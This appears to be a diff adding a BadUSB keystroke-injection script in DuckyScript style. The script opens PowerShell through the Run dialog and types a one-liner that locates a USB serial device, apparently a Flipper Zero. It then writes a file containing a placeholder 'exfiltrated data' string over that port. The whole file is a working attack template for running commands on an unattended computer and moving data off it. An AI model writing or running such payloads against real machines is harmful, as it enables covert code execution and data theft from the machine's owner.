@@ -1,0 +1,11 @@
+REM Open Powershell
+DELAY 500
+GUI r
+DELAY 500
+STRING powershell
+DELAY 500
+ENTER
+DELAY 750
+
+STRING Start-Sleep -Seconds 10; $mydevs = (Get-PnPDevice | Where-Object{$_.PNPClass -in  "WPD","AndroidUsbDeviceClass","Modem","Ports" } | Where-Object{$_.Present -in "True"} | Where-Object{$_.Service -in "usbser"} |   Select-Object Name,DeviceID | Sort-Object Name) | Select-String -Pattern 'COM'; $splitcom = $mydevs -split ("COM"); $portnum = $splitcom[1][0]; $port = New-Object System.IO.Ports.SerialPort COM$portnum,9600,None,8,one; $port.open(); Start-Sleep -Seconds 1; $port.Write("storage write /ext/apps_data/test_power4`r`n"); Start-Sleep -Seconds 1;$port.Write("This is exfiltrated data`r`n"); Start-Sleep -Seconds 1;$port.Write("$([char] 3)");Start-Sleep -Seconds 1; $port.Close()
+ENTER
